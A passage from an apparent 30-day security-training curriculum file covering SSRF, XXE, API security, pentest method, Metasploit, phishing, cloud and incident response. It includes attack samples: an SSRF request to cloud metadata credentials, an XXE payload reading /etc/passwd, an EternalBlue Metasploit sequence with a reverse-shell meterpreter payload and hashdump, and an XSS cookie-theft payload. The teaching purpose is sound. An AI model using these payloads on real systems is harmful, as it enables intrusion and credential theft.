{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role" }
\`\`\`

## SSRF Mitigations

1. **Allowlist**: Only permit requests to a predefined list of domains/IPs
2. **Block internal ranges**: Reject requests to 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.1
3. **Disable redirects**: Attackers can bypass blocklists via open redirects if your client follows redirects
4. **Cloud IMDS protection**: Enable IMDSv2 (requires session tokens) on AWS, disable IMDS if not needed

## XML External Entity (XXE) Injection

When XML is parsed with external entity processing enabled, attackers can:
- Read local files
- Trigger SSRF via entity URLs

**Malicious XML**:
\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
\`\`\`

The parser resolves \`&xxe;\` by reading \`/etc/passwd\` and embedding its contents in the document.

**Fix**: Disable external entity processing in your XML parser:
- Java: \`factory.setFeature("http://xml.org/sax/features/external-general-entities", false)\`
- Python (lxml): Use \`resolve_entities=False\`
- Node.js: prefer JSON; if XML is needed, use a safe parser`,labHint:"Create a simple Node.js endpoint that fetches a URL and returns the content. Test it with `http://localhost:YOURPORT/health` as the target to demonstrate internal SSRF, then implement blocklist validation."},{id:"day-14",day:14,week:2,title:"API Security & Security Headers",duration:"60 min",objectives:["Secure REST and GraphQL APIs against common attacks","Implement rate limiting and authentication middleware","Audit and harden HTTP security headers"],content:`# Day 14 — API Security

## REST API Security

**Broken Object Level Authorization (BOLA)** — the #1 API vulnerability:
\`\`\`
GET /api/v1/invoices/1337   ← Does the current user own invoice 1337?
\`\`\`
Always validate ownership, not just authentication. A logged-in user should not access another user's data.

**Broken Function Level Authorization**: Admin endpoints accessible by regular users.
\`\`\`
DELETE /api/v1/users/42   ← Should only be callable by admins
\`\`\`

## Rate Limiting

Without rate limiting, attackers can:
- Brute-force credentials (login endpoints)
- Enumerate IDs (BOLA)
- Scrape data at scale

**Express.js with express-rate-limit**:
\`\`\`javascript
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                   // 100 requests per window
  standardHeaders: true,
  legacyHeaders: false,
})
app.use('/api/', limiter)
\`\`\`

## JWT Security

JSON Web Tokens are widely misused:
- **Algorithm confusion**: Verify the \`alg\` header. Reject \`none\`. Never let the client dictate the algorithm.
- **Weak secrets**: HS256 with a short or guessable secret is brute-forceable. Use RS256 for production.
- **Missing expiry**: Always set \`exp\`. Implement token refresh flows.
- **Sensitive data in payload**: JWT payload is base64-encoded, not encrypted. Never put passwords or secrets in it.

## GraphQL Security

- **Introspection**: Disable in production (\`introspection: false\`)
- **Query depth limiting**: Deeply nested queries can DoS a server
- **Query complexity analysis**: Limit total field resolution per query
- **Batching attacks**: Limit the number of operations per request`,labHint:"Add rate limiting to a login endpoint in any project. Test it by sending 100+ requests rapidly and confirm the 429 response kicks in."},{id:"day-15",day:15,week:3,title:"Penetration Testing Methodology",duration:"60 min",objectives:["Follow the standard pentest phases: scoping, recon, exploitation, reporting","Understand legal requirements and rules of engagement","Distinguish black-box, grey-box, and white-box testing"],content:`# Day 15 — Penetration Testing Methodology

## What is a Pentest?

A penetration test is an authorised, simulated attack on a system to identify exploitable vulnerabilities before malicious actors do. The key word is **authorised** — pentesting without explicit written permission is a crime in most jurisdictions.

## The Standard Pentest Phases

**1. Scoping & Rules of Engagement**
Define: what systems are in scope, what attack types are allowed, time window, emergency contacts if production is impacted. Get it in writing.

**2. Reconnaissance**
Passive (no direct contact with target): OSINT, Shodan, public records, LinkedIn, GitHub.
Active (direct contact): DNS enumeration, port scanning, web crawling.

**3. Vulnerability Discovery**
Automated scanning (Nessus, Nikto, Burp Suite) plus manual analysis. Identify candidate weaknesses.

**4. Exploitation**
Attempt to exploit findings to demonstrate real impact. Document each step — screenshots, tool output, request/response pairs.

**5. Post-Exploitation**
After gaining access: demonstrate impact (data access, lateral movement). Do not cause actual damage.

**6. Reporting**
Document: executive summary, technical findings (severity, evidence, remediation), remediation roadmap.

## Test Types

| Type | Knowledge | Use Case |
|------|-----------|----------|
| Black-box | No prior knowledge | Simulates external attacker |
| Grey-box | Limited (e.g., user account) | Most realistic; efficient |
| White-box | Full source code access | Most thorough; code review included |

## Key Tools

- **Burp Suite**: Web app proxy and scanner
- **Nmap**: Network discovery and port scanning
- **Metasploit**: Exploitation framework
- **OWASP ZAP**: Free web app scanner
- **Nikto**: Web server vulnerability scanner`,labHint:"Scope a hypothetical pentest for a company's e-commerce website. Write a one-page rules of engagement document covering: scope, out-of-scope, allowed attack types, communication protocol."},{id:"day-16",day:16,week:3,title:"Reconnaissance & OSINT",duration:"75 min",objectives:["Perform passive reconnaissance using OSINT techniques","Enumerate DNS records, subdomains, and email addresses","Use Shodan and Google dorking to find exposed assets"],content:'# Day 16 — Reconnaissance & OSINT\n\n## Passive Reconnaissance\n\nPassive recon gathers information without directly interacting with the target. Sources:\n\n**WHOIS / DNS**:\n```bash\nwhois example.com\ndig ANY example.com\n```\n\n**Subdomain enumeration**:\n```bash\namass enum -d example.com\nsubfinder -d example.com\n```\n\nCommon subdomains reveal internal structure: `dev.`, `staging.`, `admin.`, `api.`, `vpn.`\n\n**Certificate Transparency Logs**: Every issued SSL certificate is publicly logged. Query `crt.sh` to find all subdomains that have ever had a certificate.\n\n## Google Dorking\n\nAdvanced Google operators find exposed sensitive files:\n\n| Dork | Finds |\n|------|-------|\n| `site:example.com filetype:pdf` | All PDFs on the domain |\n| `site:example.com inurl:admin` | Admin panels |\n| `intext:"Index of /" site:example.com` | Open directory listings |\n| `site:github.com "example.com" "password"` | Leaked credentials on GitHub |\n\n## Shodan\n\nShodan indexes internet-connected devices by banner/header. Search examples:\n- `org:"Example Corp"` — all devices belonging to the company\n- `hostname:example.com port:3389` — RDP-exposed servers\n- `ssl:example.com` — all servers with example.com in their cert\n\n## GitHub / GitLab Recon\n\nSearch code repositories for leaked credentials:\n- Use Gitleaks or truffleHog to scan public repos\n- Search for: `api_key`, `password`, `secret`, `token`, organization-specific strings\n\n## Email Harvesting\n\nTools like `theHarvester` collect email addresses from public sources. Useful for social engineering assessments.\n\n```bash\ntheHarvester -d example.com -b google,linkedin,bing\n```',labHint:"Choose any well-known tech company. Use crt.sh, Shodan, and Google dorking (site: operator only, no exploitation) to find 5 interesting exposed assets or subdomains."},{id:"day-17",day:17,week:3,title:"Scanning & Service Enumeration",duration:"60 min",objectives:["Perform a thorough nmap scan and interpret results","Enumerate web application attack surfaces with Nikto and Burp","Identify vulnerabilities using automated tools"],content:`# Day 17 — Scanning & Enumeration

## Nmap Scan Profiles

**Fast discovery**:
\`\`\`bash
nmap -sn 192.168.1.0/24  # Ping sweep — find live hosts
\`\`\`

**Full service scan**:
\`\`\`bash
nmap -sV -sC -p- -oA scan_results target.com
\`\`\`

**Vulnerability scripts**:
\`\`\`bash
nmap --script vuln target.com  # Run all vuln-detection NSE scripts
\`\`\`

**OS fingerprinting**:
\`\`\`bash
nmap -O target.com
\`\`\`

## Nikto — Web Server Scanning

\`\`\`bash
nikto -h https://target.com -ssl
\`\`\`

Nikto checks for:
- Outdated server software
- Dangerous HTTP methods (PUT, DELETE, TRACE)
- Default files and directories (\`/phpmyadmin\`, \`/admin\`)
- Known vulnerabilities by server version

## Burp Suite — Web App Proxy

Configure your browser to use Burp as a proxy (127.0.0.1:8080). Burp intercepts every request, enabling:

- **Spider/crawl**: Discover all application endpoints
- **Active Scanner**: Automatically test endpoints for SQLi, XSS, etc.
- **Repeater**: Manually modify and replay requests
- **Intruder**: Automated attack tool (brute force, fuzzing)

**Tip**: Use the Target > Scope feature to restrict Burp to your target's domain only.

## Directory Brute-Forcing

\`\`\`bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
\`\`\`

Discovers hidden directories and files not linked from the visible application: \`/backup\`, \`/.git\`, \`/config.bak\`

## Interpreting Results

Always manually verify automated scanner findings — false positives are common. For each finding, understand: Why does this matter? Can I confirm it's actually exploitable? What's the real impact?`,labHint:"Set up DVWA or Metasploitable2 locally. Run a full nmap scan and a Nikto scan. Document your findings in a simple table: Port, Service, Version, Notable Issues."},{id:"day-18",day:18,week:3,title:"Exploitation & Metasploit",duration:"75 min",objectives:["Use Metasploit Framework to exploit a known vulnerability in a lab","Understand CVE numbering and vulnerability research","Pivot from one compromised system to reach internal targets"],content:`# Day 18 — Exploitation & Metasploit

## Understanding CVEs

A Common Vulnerability Exposure (CVE) is a unique identifier for a publicly known vulnerability: CVE-YEAR-NUMBER.

**Key resources**:
- **NVD** (nvd.nist.gov) — CVSS scores, affected versions, patch info
- **Exploit-DB** (exploit-db.com) — public exploits, PoC code
- **Shodan CVE search** — find internet-exposed systems vulnerable to a specific CVE

**CVSS Scoring**: 0.0 (none) to 10.0 (critical). Scores above 9.0 are critical and typically weaponized quickly after disclosure.

## Metasploit Framework Basics

\`\`\`bash
msfconsole
search ms17_010             # Find EternalBlue modules
use exploit/windows/smb/ms17_010_eternalblue
show options                # View required settings
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
run
\`\`\`

**Meterpreter** is Metasploit's advanced payload:
\`\`\`
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump    # Dump password hashes (requires admin)
meterpreter> run post/multi/recon/local_exploit_suggester
\`\`\`

## Lab Environment Only

**NEVER** use Metasploit against systems you don't own or have explicit written permission to test. The lab environment for this lesson is Metasploitable2 — a deliberately vulnerable Linux VM.

## Pivoting

After compromising one machine, use it as a jumping-off point to reach internal systems:

\`\`\`
meterpreter> run auxiliary/scanner/portscan/tcp RHOSTS=10.0.0.0/24
meterpreter> route add 10.0.0.0 255.255.255.0 1
msf6> use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.0/24
run
\`\`\`

## Responsible Disclosure

If you discover a vulnerability in a real system (even accidentally), follow responsible disclosure: notify the vendor privately, give them 90 days to patch, then publish. Major vendors have bug bounty programs that pay for this.`,labHint:"Using Metasploitable2 (a safe, deliberately vulnerable VM): identify its running services with nmap, find one module in Metasploit for a discovered service, and achieve remote code execution in the lab."},{id:"day-19",day:19,week:3,title:"Web App Pentesting in Practice",duration:"90 min",objectives:["Conduct a structured manual web application pentest","Chain multiple low-severity findings into a critical attack path","Write a clear, technical finding report with CVSS scores"],content:`# Day 19 — Web App Pentesting in Practice

## The Art of Chaining Vulnerabilities

Individual findings often seem low-severity in isolation. Real attackers chain them:

**Example chain**:
1. Information disclosure (verbose error): reveals the framework version (Low)
2. Known CVE for that framework version: unauthenticated RCE endpoint (Critical)
3. SSRF on a different endpoint: access internal admin panel (High)
4. Admin panel with default credentials: full account takeover (High)

**Combined impact**: Full compromise — even though steps 1 and 4 alone are low risk.

## Testing Checklist for Web Apps

\`\`\`
Authentication:
☐ Test username enumeration (different error messages for valid/invalid usernames)
☐ Brute force protection (is there rate limiting on login?)
☐ Password reset flow security (link expiry, reuse, token entropy)
☐ MFA bypass possibilities

Authorization:
☐ Test every endpoint with a lower-privilege account
☐ Horizontal privilege escalation (access other users' data)
☐ Vertical privilege escalation (access admin functions)

Input Handling:
☐ SQLi in every parameter (including headers, cookies)
☐ XSS in every reflected/stored field
☐ File upload validation
☐ Path traversal in file operations
\`\`\`

## Writing a Good Finding

Each finding should include:

**Title**: Cross-Site Scripting in Profile Name Field
**Severity**: High (CVSS 8.1)
**Affected Component**: \`POST /api/users/profile\` — \`displayName\` parameter
**Description**: The \`displayName\` field is stored without HTML encoding and rendered in the admin dashboard without sanitisation...
**Steps to Reproduce**:
1. Log in as a standard user
2. Navigate to Profile Settings
3. Set Display Name to \`<img src=x onerror=alert(document.cookie)>\`
4. Log in as an admin and view the Users table
5. Observe JavaScript execution — cookie captured

**Impact**: Attacker can steal admin session cookies, enabling full account takeover and data exfiltration.
**Remediation**: HTML-encode all user-controlled data before rendering. Implement HttpOnly on session cookies. Add CSP.`,labHint:"Run through the complete web app pentest checklist against DVWA (set to medium security). Write up your top 3 findings in the structured format described above."},{id:"day-20",day:20,week:3,title:"Social Engineering & Phishing",duration:"60 min",objectives:["Understand the psychology behind social engineering attacks","Recognize phishing email indicators","Design a basic security awareness training programme"],content:`# Day 20 — Social Engineering

## Why Social Engineering Works

Technical controls can be bypassed by targeting the human layer. Studies show 98% of cyberattacks rely on social engineering. The most secure network in the world can be compromised by one employee clicking a phishing link.

**Core psychological triggers**:
- **Authority**: "This is your CEO, I need you to wire funds immediately"
- **Urgency**: "Your account will be suspended in 24 hours"
- **Fear**: "Your computer is infected, call this number"
- **Scarcity**: "You've been selected for a limited security review"
- **Curiosity**: "See who viewed your profile"

## Phishing Attack Types

**Spear Phishing**: Highly targeted. Attacker researches the victim (LinkedIn, Twitter) to craft a believable email using real names, projects, and context.

**Whaling**: Spear phishing targeting C-suite executives.

**Vishing**: Voice phishing — phone calls from "IT support" or "your bank" requesting credentials or OTP codes.

**Smishing**: SMS phishing — fake delivery notifications, bank alerts.

**Business Email Compromise (BEC)**: Attacker impersonates an executive or vendor to redirect payments or exfiltrate data.

## Identifying Phishing Emails

Check for:
- Sender domain (hover before clicking): \`support@paypa1.com\` vs \`paypal.com\`
- Generic greetings vs your actual name
- Urgency language and threats
- Links that don't match hover-over URL
- Unexpected attachments (PDF, Office docs)
- Requests to disable security controls

## Security Awareness Training

Effective training includes:
1. Regular phishing simulations (not punitive, educational)
2. Clear reporting procedures (who to call when you suspect phishing)
3. Specific, role-based scenarios
4. Metrics: click rate, report rate, time to report`,labHint:"Create a phishing awareness checklist for 5 common phishing scenarios your team might receive. For each, explain the red flags someone should look for."},{id:"day-21",day:21,week:3,title:"Mobile App Security",duration:"60 min",objectives:["Identify the OWASP Mobile Top 10 categories","Inspect mobile app traffic with a proxy","Analyse an APK or IPA for insecure data storage"],content:`# Day 21 — Mobile App Security

## OWASP Mobile Top 10

**M1: Improper Credential Usage** — Hardcoded API keys in app code, weak credential management.

**M2: Inadequate Supply Chain Security** — Vulnerable third-party SDKs, malicious packages.

**M3: Insecure Authentication** — Missing session expiry, no certificate pinning.

**M4: Insufficient Input/Output Validation** — SQLite injection, command injection in local processing.

**M5: Insecure Communication** — HTTP traffic, no certificate pinning, trusting all certificates.

**M6: Inadequate Privacy Controls** — Over-collection of PII, storing data in logs or analytics.

**M7: Insufficient Binary Protections** — No obfuscation, easily reversible code.

**M8: Security Misconfiguration** — Debug flags in production, permissive backup settings.

**M9: Insecure Data Storage** — Credentials in SharedPreferences (Android) or NSUserDefaults (iOS) in cleartext.

**M10: Insufficient Cryptography** — Hardcoded encryption keys, weak algorithms.

## Intercepting Mobile Traffic

1. Install Burp Suite certificate on device/emulator
2. Configure device/emulator proxy to Burp (192.168.x.x:8080)
3. Intercept all HTTP/HTTPS traffic from the app

**Certificate pinning bypass** (for testing only):
Use Frida + objection to bypass SSL pinning at runtime:
\`\`\`bash
frida-ps -U  # List processes
objection -g com.target.app explore
android sslpinning disable
\`\`\`

## Static Analysis

Decompile Android APK:
\`\`\`bash
apktool d target.apk
jadx -d output/ target.apk  # Decompile to Java
grep -r "api_key|password|secret" output/
\`\`\`

Decompile iOS IPA:
- Use Hopper Disassembler or Ghidra
- Check Info.plist for secrets
- Grep binary strings: \`strings -a AppName | grep -i key\``,labHint:"Download any APK from APKPure (a free app you use). Decompile with jadx. Search for hardcoded strings: API keys, URLs, or debug flags."},{id:"day-22",day:22,week:4,title:"Secure Code Review",duration:"75 min",objectives:["Conduct a structured manual code review for security issues","Use static analysis tools (Semgrep, CodeQL) effectively","Prioritise findings based on reachability and exploitability"],content:`# Day 22 — Secure Code Review

## Why Code Review Matters

Automated scanners have high false-positive rates and miss business-logic vulnerabilities. Manual review by a security-aware developer is irreplaceable.

## Review Strategy

**Top-down approach**:
1. Understand the application's architecture and trust boundaries
2. Identify high-value targets (authentication, authorisation, payment, admin functions)
3. Trace data flows from input to output
4. Look for dangerous function calls and patterns

**Data-flow approach**:
- Source: where does untrusted data enter? (HTTP params, cookies, headers, file uploads, env vars)
- Sink: where is data used dangerously? (SQL queries, HTML output, shell commands, file paths)
- Sanitisation: what checks occur between source and sink?

## Dangerous Function Patterns

\`\`\`javascript
// Dangerous sinks (JavaScript)
eval(userInput)
document.innerHTML = userInput
child_process.exec('ls ' + userInput)
fs.readFile(basePath + userInput)
db.query('SELECT * FROM ' + tableName)
\`\`\`

\`\`\`python
# Dangerous sinks (Python)
os.system(f"convert {filename}")
eval(user_expression)
subprocess.run(user_cmd, shell=True)
\`\`\`

## Semgrep — Pattern-Based SAST

\`\`\`bash
semgrep --config=p/owasp-top-ten .
semgrep --config=p/javascript .
semgrep --config=p/nodejs-express-jwt .
\`\`\`

Semgrep uses rules that understand code structure, not just text patterns. Write custom rules for business-specific patterns.

## CodeQL

GitHub's semantic code analysis engine. Available free for open-source projects via GitHub Actions.

\`\`\`yaml
- uses: github/codeql-action/analyze@v3
  with:
    languages: javascript, python
    queries: security-extended
\`\`\`

## Triaging Results

For each finding: (1) Is it reachable from untrusted input? (2) Is there a sanitisation step we missed? (3) What's the real-world impact? False positives waste time — verify before reporting.`,labHint:"Run Semgrep on any open-source project you use: `semgrep --config=p/owasp-top-ten https://github.com/user/repo`. Investigate 3 findings and determine if they are true or false positives."},{id:"day-23",day:23,week:4,title:"DevSecOps & CI/CD Pipeline Security",duration:"75 min",objectives:["Embed security checks into a CI/CD pipeline (GitHub Actions)","Implement dependency scanning and secret detection","Design a developer-friendly security gate that does not block shipping"],content:`# Day 23 — DevSecOps

## Shift Left Security

"Shift left" means catching security issues earlier in the development lifecycle. A bug caught in code review costs 10x less than one caught in production, and 100x less than one exploited by an attacker.

**DevSecOps pipeline layers**:
1. **Developer IDE**: Real-time linting (ESLint security rules, Bandit for Python)
2. **Git pre-commit**: Secret scanning (gitleaks), SAST snippets
3. **CI/CD PR check**: Full SAST, dependency audit, container scan
4. **Pre-release gate**: DAST against staging, penetration test summary
5. **Production**: Runtime monitoring, WAF, anomaly detection

## GitHub Actions Security Pipeline

\`\`\`yaml
name: Security Checks
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Secret scanning
      - uses: gitleaks/gitleaks-action@v2

      # Dependency audit
      - run: npm audit --audit-level high

      # SAST with Semgrep
      - uses: semgrep/semgrep-action@v1
        with:
          config: p/owasp-top-ten

      # Container scan
      - uses: aquasecurity/trivy-action@master
        with:
          image-ref: my-app:latest
          severity: HIGH,CRITICAL
\`\`\`

## Secret Detection with Gitleaks

\`\`\`bash
gitleaks detect --source . --verbose
\`\`\`

Gitleaks uses regex patterns to find: API keys, tokens, passwords, private keys. Configure \`.gitleaks.toml\` to add custom patterns for your platform's key formats.

## Making Security Developer-Friendly

- **Don't block on low/medium** in PRs — it kills velocity and trains developers to ignore alerts
- **Gate on Critical/High only** — with clear error messages and remediation links
- **Track security debt separately** — in a security backlog, not as PR blockers for old code
- **Celebrate fixes** — recognise developers who address findings proactively`,labHint:"Create a `.github/workflows/security.yml` that runs gitleaks and npm audit on every PR. Test it by temporarily committing a fake API key (e.g., `FAKE_AWS_KEY=AKIAIOSFODNN7EXAMPLE`)."},{id:"day-24",day:24,week:4,title:"Container & Kubernetes Security",duration:"75 min",objectives:["Identify common Docker security misconfigurations","Scan container images for vulnerabilities with Trivy","Apply Kubernetes RBAC and Pod Security Standards"],content:`# Day 24 — Container Security

## Docker Security Fundamentals

**Never run as root in containers**:
\`\`\`dockerfile
# Bad
FROM ubuntu
RUN apt-get install -y myapp
CMD ["myapp"]

# Good
FROM ubuntu
RUN useradd -r -s /bin/false appuser
RUN apt-get install -y myapp
USER appuser
CMD ["myapp"]
\`\`\`

**Use minimal base images**:
- \`ubuntu:latest\` = 77MB+ of attack surface
- \`alpine:3.19\` = 7MB
- \`scratch\` (static binaries only) = 0MB

**Multi-stage builds** — exclude build tools from the runtime image:
\`\`\`dockerfile
FROM node:20 AS builder
WORKDIR /app
COPY . .
RUN npm ci && npm run build

FROM node:20-alpine AS runtime
WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
CMD ["node", "dist/index.js"]
\`\`\`

## Scanning with Trivy

\`\`\`bash
trivy image myapp:latest
trivy fs .                      # Scan filesystem
trivy repo github.com/user/repo # Scan remote repo
\`\`\`

Trivy detects: CVEs in OS packages and language libraries, misconfigurations, secrets.

## Kubernetes Security

**RBAC (Role-Based Access Control)**: Grant the minimum permissions needed.
\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]  # No create, delete, or exec!
\`\`\`

**Pod Security Standards**: Kubernetes built-in admission controller with three profiles:
- **Privileged**: No restrictions (don't use in production)
- **Baseline**: Prevents known privilege escalation
- **Restricted**: Hardened (requires non-root, drops capabilities)

**Network Policies**: Kubernetes firewall rules — restrict pod-to-pod communication to only what's needed.`,labHint:"Pull any Docker image from your tech stack (e.g., `docker pull node:18`) and scan it with `trivy image node:18`. Compare the CVE count with `node:18-alpine`."},{id:"day-25",day:25,week:4,title:"Cloud Security (AWS / Azure)",duration:"75 min",objectives:["Apply the AWS shared responsibility model to your architecture","Audit IAM roles and S3 bucket policies for misconfigurations","Use cloud-native security tools (GuardDuty, Security Hub)"],content:`# Day 25 — Cloud Security

## Shared Responsibility Model

Cloud providers secure the infrastructure *of* the cloud. You secure everything *in* the cloud: your data, your IAM, your application.

**AWS responsibility**: Datacenters, physical hardware, hypervisor, managed service infrastructure.

**Your responsibility**: VPC configuration, security groups, IAM policies, data encryption, application code, OS patches (for EC2).

## AWS IAM Best Practices

**Principle of least privilege** — give each role only what it needs:
\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::my-specific-bucket/*"
  }]
}
\`\`\`

**Avoid**:
- \`"Action": "*"\` — wildcard actions
- \`"Resource": "*"\` — all resources
- Long-lived access keys for services (use IAM roles instead)
- Root account for daily operations

## Common Cloud Misconfigurations

**Public S3 Buckets**: Inadvertently public buckets have exposed billions of records.
\`\`\`bash
# Check bucket public access block
aws s3api get-public-access-block --bucket my-bucket
\`\`\`

**Security Groups**: Overly permissive ingress rules.
\`\`\`bash
# Find SGs with 0.0.0.0/0 ingress on sensitive ports
aws ec2 describe-security-groups | jq '.SecurityGroups[] |
  select(.IpPermissions[].IpRanges[].CidrIp == "0.0.0.0/0")'
\`\`\`

**IMDSv1 enabled**: Allows SSRF to steal instance credentials. Enforce IMDSv2.

## AWS Security Services

- **GuardDuty**: ML-based threat detection on CloudTrail, VPC Flow Logs, DNS logs
- **Security Hub**: Aggregates findings from all AWS security services and partners
- **CloudTrail**: Complete API audit log — enable in all regions
- **Config**: Tracks resource configuration changes and compliance`,labHint:'If you have an AWS account: use the Security Hub "AWS Foundational Security Best Practices" standard (free tier). Review the first 5 findings and understand how to remediate them.'},{id:"day-26",day:26,week:4,title:"Incident Response",duration:"75 min",objectives:["Follow the NIST incident response lifecycle","Conduct basic forensic triage on a compromised system","Write an incident report with timeline and remediation"],content:`# Day 26 — Incident Response

## The NIST IR Lifecycle

**1. Preparation**: IR plan, contact list, communication templates, forensic tools ready. Don't wait for an incident to figure out your process.

**2. Detection & Analysis**: Alerts from SIEM, EDR, or user reports. Determine: Is this a real incident? What's the scope? What systems are affected?

**3. Containment**: Stop the bleeding. Short-term (isolate affected host) and long-term (patch the vulnerability, rotate credentials).

**4. Eradication**: Remove the threat — malware, backdoors, attacker accounts.

**5. Recovery**: Restore systems from clean backups. Monitor closely for re-infection.

**6. Post-Incident Activity**: Root cause analysis, lessons learned, update IR plan.

## Initial Triage Checklist

When investigating a potentially compromised Linux host:

\`\`\`bash
# Who is currently logged in?
w && who && last -10

# What processes are running?
ps auxf

# What's listening on the network?
ss -tlnp

# Recent file modifications
find /var /tmp /dev/shm -mtime -1 -type f 2>/dev/null

# Check cron jobs (persistence mechanism)
crontab -l && cat /etc/cron*

# Check for new user accounts
cat /etc/passwd | awk -F: '$3 >= 1000'

# Check SSH authorized keys
find /home -name "authorized_keys" -exec cat {} ;

# Review auth log
tail -100 /var/log/auth.log | grep -i "accepted|failed|invalid"
\`\`\`

## Forensic Preservation

Collect volatile data first (it disappears on reboot):
1. Running processes and network connections
2. Memory dump (if time permits)
3. System logs

Then non-volatile:
4. Disk image (for detailed forensics)
5. File system timeline

**Never** run cleanup tools or antivirus before collecting evidence — they destroy forensic artifacts.

## Communication During an Incident

- Notify stakeholders on a separate, trusted channel (the attacker may be reading your Slack)
- Log all actions taken during the investigation (legal/forensic record)
- Legal and PR should be looped in early for significant breaches`,labHint:'Write an IR runbook for one scenario: "Developer reports their laptop may be compromised after clicking a phishing link." Cover: initial triage steps, containment actions, what to preserve, who to notify.'},{id:"day-27",day:27,week:4,title:"Compliance & Governance",duration:"60 min",objectives:["Understand PCI-DSS, GDPR, and SOC 2 at a conceptual level","Map controls to compliance requirements","Implement a basic privacy-by-design approach"],content:`# Day 27 — Compliance & Governance

## Why Compliance Matters (and Its Limits)

Compliance frameworks (PCI-DSS, GDPR, SOC 2, ISO 27001) codify a minimum security baseline. They're useful for:
- Communicating security posture to customers and auditors
- Providing a structured checklist to avoid common mistakes
- Legal protection (demonstrated due diligence)

But compliance ≠ security. You can be fully PCI-DSS compliant and still be breached within the framework's gaps.

## PCI-DSS (Payment Card Industry Data Security Standard)

Applies to: Any organisation that stores, processes, or transmits cardholder data.

**12 Requirements summarised**:
1. Maintain a firewall configuration
2. No vendor defaults (change all default passwords)
3. Protect stored cardholder data (encrypt)
4. Encrypt transmission over open networks
5. Protect against malware
6. Develop secure systems (patch management)
7. Restrict access by need-to-know
8. Identify and authenticate access
9. Restrict physical access
10. Track and monitor all access to network resources
11. Regularly test security systems (pentest, scans)
12. Maintain an information security policy

**Key insight**: The simplest way to reduce PCI scope is to use a payment processor (Stripe, Braintree) — they become the cardholder data environment, not you.

## GDPR (General Data Protection Regulation)

Applies to: Any organisation processing personal data of EU residents.

**Key principles**:
- **Lawfulness**: Have a legal basis for processing (consent, contract, legitimate interest)
- **Data minimisation**: Collect only what you need
- **Purpose limitation**: Don't use data for purposes beyond what was disclosed
- **Storage limitation**: Delete data when no longer needed
- **Data subject rights**: Access, rectification, erasure ("right to be forgotten"), portability

**Privacy by design**: Build privacy controls in from the start, not bolted on. Pseudonymise data where possible. Encrypt personal data at rest.

## SOC 2

Developed by AICPA for SaaS companies. Audits against five Trust Service Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy. A SOC 2 Type II report covers actual controls over 6-12 months.`,labHint:"Map your last project's data flows to GDPR principles. List: (1) what personal data you collect, (2) the legal basis, (3) where it's stored, (4) who has access, (5) when it's deleted."},{id:"day-28",day:28,week:4,title:"Security Monitoring & SIEM",duration:"60 min",objectives:["Design a logging strategy for a web application","Understand SIEM concepts and write basic detection rules","Set up alerts for the most impactful security events"],content:`# Day 28 — Security Monitoring

## What to Log

**Authentication events**:
\`\`\`json
{ "event": "login_success", "user": "alice@co.com", "ip": "1.2.3.4", "ts": "2025-01-01T00:00:00Z" }
{ "event": "login_failure", "user": "alice@co.com", "ip": "1.2.3.4", "ts": "..." }
\`\`\`

**Authorization failures**:
\`\`\`json
{ "event": "authz_denied", "user": "bob", "resource": "/admin/users", "method": "GET" }
\`\`\`

**High-value actions**: Password changes, MFA changes, privilege grants, data exports.

**Input validation failures**: Log the parameter and sanitised value, but never log raw user input containing PII.

## Log Integrity and Forwarding

Logs are worthless if an attacker can modify or delete them after compromise. Strategies:
- Forward logs in real-time to an external SIEM (attacker can't delete what they can't reach)
- Use append-only log storage
- Implement log signing

## SIEM Detection Rules

A SIEM (Security Information and Event Management) correlates events and fires alerts. Basic detection rules:

**Brute force detection**:
\`\`\`
IF login_failure count > 10 FROM same IP WITHIN 5 minutes
THEN ALERT "Brute force attempt" AND block IP for 30 min
\`\`\`

**Impossible travel**:
\`\`\`
IF login_success FROM IP geolocated to US
AND login_success FROM same user FROM IP geolocated to RU
AND time difference < 2 hours
THEN ALERT "Impossible travel detected"
\`\`\`

**After-hours admin access**:
\`\`\`
IF admin_action event AND hour NOT BETWEEN 08:00 AND 20:00
THEN ALERT "After-hours admin activity"
\`\`\`

## Practical Tools

- **ELK Stack**: Elasticsearch + Logstash + Kibana — free, self-hosted
- **Grafana + Loki**: Lighter-weight log aggregation with great dashboards
- **AWS CloudWatch**: For cloud-native monitoring
- **Datadog / Splunk**: Commercial SIEMs with managed detection rules`,labHint:"Add structured JSON logging to a small project. Implement and log 3 events: login_success, login_failure, and authz_denied. View the logs in a way that makes suspicious patterns visible."},{id:"day-29",day:29,week:5,title:"Full Red Team Exercise",duration:"3 hours",objectives:["Conduct a structured end-to-end red team exercise in a lab environment","Apply all phases: recon, scanning, exploitation, post-exploitation, reporting","Demonstrate complete attack chain from external foothold to data exfiltration"],content:`# Day 29 — Full Red Team Exercise

## Exercise Brief

Today you conduct a simulated engagement against a deliberately vulnerable environment (VulnHub machine or TryHackMe room). Treat it as a real engagement:

**Rules of engagement for this exercise**:
- Target: Lab VM or TryHackMe/HackTheBox room of your choice
- Scope: All services on the target
- Objective: Achieve root/SYSTEM, capture any flags, document findings
- Time limit: 3 hours

## Phase 1: Reconnaissance (30 min)

\`\`\`bash
# Network discovery
nmap -sn <subnet>

# Full port scan
nmap -sV -sC -p- -oA recon/<target_ip> <target_ip>

# Web enumeration (if HTTP port found)
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt
nikto -h http://<target>/
\`\`\`

Document: Open ports, service versions, OS, web technologies.

## Phase 2: Vulnerability Discovery (45 min)

